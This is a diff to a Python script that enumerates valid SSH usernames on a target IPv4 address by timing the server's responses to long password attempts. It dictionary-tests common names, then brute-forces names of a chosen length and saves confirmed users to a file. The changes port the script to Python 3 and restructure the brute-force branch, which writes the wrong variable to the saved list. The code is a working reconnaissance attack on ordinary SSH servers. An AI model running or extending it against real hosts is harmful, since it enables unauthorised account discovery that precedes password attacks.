@@ -109,10 +109,10 @@ def sidechan(user,machine,pass_len):
 
 def display(existing):
 	if len(existing)>0:
-		print("The following users were found:")
+		print("The following users seem likely to exist:")
 		for (name,_) in existing:
 			print(name)
-		print("It is possible some of these are false positives if jitter or variance in cpu load occured during tests.")
+		print("It is possible they are false positives if jitter or variance in cpu load occured during tests.")
 	else:
 		print("No users were found from the common username list.")
 
@@ -141,7 +141,7 @@ def etc(avg_rtt, min_len, max_len):
 	return etc
 
 #Begin the main program
-machine = raw_input("Enter the IPv4 address to enumerate SSH users on: ")
+machine = input("Enter the IPv4 address to enumerate SSH users on: ")
 if is_ipv4(machine):
 	if is_private(machine):
 		pass_len = 3000
@@ -182,11 +182,11 @@ avg_rtt = average(nonexisting)
 #print results
 results = []
 print("We have exhausted our common username list.")
-ans = raw_input("Would you like to brute force other names (y/n)? ")
+ans = input("Would you like to brute force other names (y/n)? ")
 if ans == "y":
 	#Dictionary List exhausted, let's bruteforce
-	min_len = raw_input("Enter the min user name length (inclusive): ")
-	max_len = raw_input("Enter the max user name length (inclusive): ")
+	min_len = input("Enter the min user name length (inclusive): ")
+	max_len = input("Enter the max user name length (inclusive): ")
 	time_estimate = etc(avg_rtt, int(min_len), int(max_len))
 	time_estimate = time_estimate/60
 	if time_estimate == 0:
@@ -218,18 +218,20 @@ if ans == "y":
 				if dur > 3*avg_rtt:
 					print (name+' probably exists; test it by hand to see RTT.')
 					probable.append(name)
-if probable == []:
-	print ("No users were found during the brute-force enumeration.")
+	if probable == []:
+		print ("No users were found during the brute-force enumeration.")
+	else:
+		for potential_user in probable:
+			x = sidechan(potential_user,machine,pass_len)
+			y = sidechan(potential_user,machine,pass_len)
+			z = sidechan(potential_user,machine,pass_len)
+			if x > 3*avg_rtt and y > 3*avg_rtt and z > 3*avg_rtt:
+				f = open('Ranked-Users.txt', 'a');
+				f.write(name+'\n');
+				f.close();
+				print (potential_user+' exists and has been added to the saved user list.')
+			else:
+				print (potential_user+' was probably a false positive.')
+	sys.stdout.write('\n')
 else:
-	for potential_user in probable:
-		x = sidechan(potential_user,machine,pass_len)
-		y = sidechan(potential_user,machine,pass_len)
-		z = sidechan(potential_user,machine,pass_len)
-		if x > 3*avg_rtt and y > 3*avg_rtt and z > 3*avg_rtt:
-			f = open('Ranked-Users.txt', 'a');
-			f.write(name+'\n');
-			f.close();
-			print (potential_user+' exists and has been added to the saved user list.')
-		else:
-			print (potential_user+' was probably a false positive.')
-sys.stdout.write('\n')
+	sys.exit()
